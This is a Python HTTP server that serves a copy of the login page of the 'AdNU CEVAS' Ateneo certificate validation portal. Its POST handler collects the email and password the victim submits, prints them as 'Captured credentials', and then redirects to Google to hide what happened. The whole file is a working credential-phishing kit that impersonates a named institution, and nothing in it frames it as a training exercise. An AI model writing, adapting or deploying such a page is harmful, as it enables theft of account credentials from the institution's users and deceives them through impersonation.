from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import os

hostName = "localhost"
serverPort = 8443

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()

            html_content = """
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <link rel="preconnect" href="https://fonts.googleapis.com">
                <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
                <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>ADNU CEVAS | Log in</title>
                <style>
                    * {
                        font-family: 'Poppins', sans-serif;
                    }
                    body, h1, h2, h3, p, a, input, button {
                        margin: 0;
                        padding: 0;
                        box-sizing: border-box;
                    }
                    body {
                        background-color: #f9f9f9;
                        display: flex;
                        flex-direction: column;
                        height: 100vh;
                        margin: 0;
                    }
                    .full-screen-container {
                        display: flex;
                        flex-direction: column;
                        height: 100%;
                    }
                    .header {
                        background-color: #003366;
                        color: white;
                        display: flex;
                        align-items: center;
                        padding: 10px 20px;
                        gap: 15px;
                        flex-shrink: 0;
                    }
                    .header .logo {
                        width: 55px;
                        height: 55px;
                    }
                    .header h1 {
                        font-size: 20px;
                        font-weight: bold;
                    }
                    .login-section {
                        display: flex;
                        align-items: center;
                        justify-content: center;
                        flex-grow: 1;
                        padding: 20px;
                        background-color: #f9f9f9;
                    }
                    .login-box {
                        width: 100%;
                        max-width: 400px;
                        padding: 20px;
                        text-align: center;
                        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                        border-radius: 8px;
                        background-color: #ffffff;
                    }
                    .logo-container {
                        margin-bottom: 15px;
                    }
                    .cevas-logo {
                        width: 60px;
                        height: 60px;
                        margin-bottom: 5px;
                    }
                    h2 {
                        font-size: 22px;
                        margin-bottom: 15px;
                        color: #003366;
                    }
                    .welcome-text {
                        font-size: 18px;
                        margin-bottom: 25px;
                        color: #333333;
                    }
                    .form-group {
                        margin-bottom: 20px;
                        width: 100%;
                    }
                    .form-group input {
                        width: 100%;
                        padding: 12px;
                        font-size: 14px;
                        border: 1px solid #ddd;
                        border-radius: 4px;
                        outline: none;
                        transition: border-color 0.3s;
                    }
                    .form-group input:focus {
                        border-color: #003366;
                    }
                    .form-actions {
                        display: flex;
                        justify-content: space-between;
                        align-items: center;
                        font-size: 12px;
                        margin-bottom: 20px;
                    }
                    .btn {
                        display: inline-block;
                        padding: 12px;
                        font-size: 14px;
                        border: none;
                        border-radius: 4px;
                        cursor: pointer;
                        text-align: center;
                        color: white;
                        transition: background-color 0.3s;
                        background-color: #003366;
                        width: 100%;
                    }
                    .btn:hover {
                        background-color: #002244;
                    }
                    .register-link {
                        font-size: 12px;
                        color: #333333;
                    }
                    .register-link a {
                        color: #003366;
                        text-decoration: none;
                        font-weight: bold;
                    }
                    .register-link a:hover {
                        text-decoration: underline;
                    }
                </style>
            </head>
            <body>
                <div class="full-screen-container">
                    <header class="header">
                        <img src="/images/adnulogo.png" alt="AdNU Logo" class="logo">
                        <h1>Ateneo Certificate Validation System</h1>
                    </header>
                    <main class="login-section">
                        <div class="login-box">
                            <div class="logo-container">
                                <img src="/images/adnulogo.png" alt="CEVAS Logo" class="cevas-logo">
                                <h2>AdNU CEVAS</h2>
                            </div>
                            <h3 class="welcome-text">Welcome Back!</h3>
                            <form action="/" method="POST" class="login-form">
                                <div class="form-group">
                                    <input type="email" name="email" placeholder="Enter your email" required>
                                </div>
                                <div class="form-group">
                                    <input type="password" name="password" placeholder="Enter your password" required>
                                </div>
                                <div class="form-actions">
                                    <label>
                                        <input type="checkbox" name="remember"> Remember me
                                    </label>
                                </div>
                                <button type="submit" class="btn">Login</button>
                            </form>
                            <p class="register-link">
                                Don't have an account? <a href="#">Create Account</a>
                            </p>
                        </div>
                    </main>
                </div>
            </body>
            </html>
            """
            self.wfile.write(html_content.encode("utf-8"))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        queries = parse_qs(post_data)

        email = queries.get("email", [""])[0]
        password = queries.get("password", [""])[0]

        print(f"Captured credentials -> Email: {email}, Password: {password}")

        self.send_response(302)
        self.send_header("Location", "https://www.google.com")
        self.end_headers()

if __name__ == "__main__":
    webServer = HTTPServer((hostName, serverPort), MyServer) 
    print(f"Server started at http://{hostName}:{serverPort}")

    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass
    
    webServer.server_close() 
    print("Server stopped.")
